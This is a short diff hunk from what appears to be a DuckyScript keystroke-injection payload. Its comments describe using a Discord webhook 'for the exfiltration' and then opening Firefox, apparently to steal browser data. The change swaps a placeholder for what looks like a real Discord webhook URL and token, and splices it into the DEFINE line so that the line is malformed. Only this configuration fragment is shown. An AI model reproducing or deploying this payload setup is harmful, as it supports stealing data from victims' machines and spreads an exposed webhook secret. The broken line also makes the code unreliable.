@@ -14,7 +14,7 @@ REM     - Firefox installed
 
 
 REM You must define your Discord webhook if you want to use this method for the exfiltration
-DEFINE DISCORD_WEBHOOK example
+DEFINE DISCORD_https://discord.com/api/webhooks/1396005497295077406/6gytWJ52MhtJmVWrgpUV4hHNfeFGkHPB7bmy2INQL97rTmmyk5sUPIfeoKofAgeXgrWt example
 
 REM Open Firefox
 GUI
